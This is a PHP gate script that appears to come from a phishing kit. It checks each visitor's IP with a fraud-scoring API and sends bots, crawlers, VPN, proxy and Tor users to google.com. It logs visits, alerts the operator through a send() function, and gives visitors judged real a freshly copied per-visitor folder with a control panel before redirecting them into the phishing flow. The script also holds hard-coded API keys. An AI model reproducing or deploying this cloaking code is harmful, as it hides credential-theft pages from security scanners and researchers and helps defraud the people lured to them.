<?php
include_once 'app.php';
include_once 'space/rand.php';
include './space/send.php';
#################################
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
//$ip = "41.140.190.69";
$re = $_GET["hint"];
$date = date("h:i:s A | l");
///UKNOWN REFFER
    if(strcmp($re, $redirect)!=0 ||empty($re))
    {
    $info = "UKNOWEN REFFER" ;
    $hex = "New Visit [".$ip."] => ".$info." @Time ".$date." \n";
    $file = fopen("v.txt","a");
    fwrite($file,$hex);
    send($hex,"⚠️NEW VISIT FROM UKNOWN REFFER:⚠️ ".$ip."");
    header("Location: https://google.com");
    exit();
    }
#####################################
//SEND REQUEST
header("Content-Type:application/json");
$apikeys = array(
"8EkfGWHBSDr3YnM8b7P93iv7nAjGlhOG","zWmLsoWfTpgKQfas3xeYSewbWmYhXK6U");
$randIndex = array_rand($apikeys);
$onekey = $apikeys[$randIndex];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ipqualityscore.com/api/json/ip/'.$onekey.'/'.$ip.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$result = curl_exec($ch);
$s = json_decode($result,TRUE);
///////////////////////////////////
$fraud_score  = $s["fraud_score"];
$country_code = $s["country_code"];
$region       = $s["region"];
$is_crawler   = $s["is_crawler"];
$proxy        = $s["proxy"];
$vpn          = $s["vpn"];
$tor          = $s["tor"];
$active_vpn         = $s["active_vpn"];
$active_tor        = $s["active_tor"];
$bot_status        = $s["bot_status"];
///////////////////////////////////
$info = "";
#### START
/// BOT DETECTED
if( $fraud_score>=75 || $is_crawler == true || $proxy == true || $vpn == true || $active_vpn == true || $active_tor == true || $bot_status == true)
{
    $info = "BOT -_-";
    $hex = "New Visit [".$ip."] From [".$country_code."|".$region."] | ".$info." @Time ".$date." \n";
    $file = fopen("v.txt","a");
    fwrite($file,$hex);
    send($hex,"⚠️NEW BOT VISITED THE PAGE: ".$ip."");
    header("location: https://google.com");
    exit();

}
if(empty($info))
{
        $info = "REAL ^_^";
        $hex = "New Visit [".$ip."] From [".$country_code."|".$region."] | ".$info." @Time ".$date." \n";
        $file = fopen("v.txt","a");
        send($hex,"⚠️ATTENTION⚠️");
        fwrite($file,$hex);
$sourceFolder = './app';
$destinationFolder = 'app-' . rand(10000000000000, 99999999999999);

if (!is_dir($sourceFolder) || !mkdir($destinationFolder)) {
    echo "Failed to copy the folder.";
    exit;
}

$files = glob($sourceFolder . '/*');
foreach ($files as $file) {
    copy($file, $destinationFolder . '/' . basename($file));
}       
        
$siteUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://") . $_SERVER['HTTP_HOST'];
$control_link = $siteUrl."/n/".$destinationFolder."/control.php";
        header("Location: ./".$destinationFolder."/inform.php?sessc=$rand50&querry=$rand30&stp=first");
        exit();
}

?>